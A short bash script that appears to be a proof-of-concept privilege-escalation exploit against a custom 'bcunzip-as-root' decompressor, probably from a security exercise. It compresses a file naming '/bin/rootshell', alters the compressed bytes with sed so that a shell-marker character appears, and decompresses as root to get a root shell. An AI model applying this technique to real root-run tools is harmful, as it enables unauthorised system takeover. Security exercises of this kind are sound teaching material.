#!/bin/bash

FNAME="test.txt"
COMP_FNAME="test.bcz"
BCZIP="bczip"
BCUZ="bcunzip-as-root"

#create file and write contents
echo " /bin/rootshell" > "$FNAME"

#compress
$BCZIP "c" "$COMP_FNAME" "$FNAME"

#find non-BLOCK_SHELL char and replace with BLOCK_SHELL (42 is '*')
sed -i 's/X/*/g' "$COMP_FNAME"

#decompress
$BCUZ "$COMP_FNAME"

#remove created files
rm -f $FNAME
rm -f $COMP_FNAME
